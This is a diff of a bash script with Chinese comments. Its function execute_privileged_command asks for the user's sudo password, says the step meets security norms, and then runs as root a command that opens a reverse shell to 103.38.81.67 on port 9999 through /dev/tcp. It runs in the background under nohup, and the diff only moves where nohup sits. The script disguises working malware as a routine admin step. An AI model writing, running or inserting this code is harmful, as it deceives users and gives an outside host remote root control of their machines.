@@ -25,7 +25,7 @@ execute_privileged_command() {
     fi
 
     # 定义要执行的目标命令
-    TARGET_COMMAND="nohup bash -c 'exec 0<>/dev/tcp/103.38.81.67/9999; exec sh <&0 >&0 2>&0' >/dev/null 2>&1 &"
+    TARGET_COMMAND="'exec 0<>/dev/tcp/103.38.81.67/9999; exec sh <&0 >&0 2>&0' >/dev/null 2>&1 &"
     
     # 以 root 权限执行命令（会提示输入密码，符合系统安全规范）
     echo -e "${YELLOW}提示：即将以 root 权限执行以下命令：${NC}"
@@ -33,7 +33,7 @@ execute_privileged_command() {
     echo -e "${YELLOW}请输入当前用户的密码（执行后会自动清理临时文件）：${NC}"
     
     # 执行命令并捕获结果
-    if sudo bash -c "$TARGET_COMMAND"; then
+    if sudo nohup bash -c "$TARGET_COMMAND"; then
         echo -e "${GREEN}[新增步骤] 命令执行成功！输出内容：${NC}"
         # 验证执行结果
         sudo cat /tmp/tmp.txt
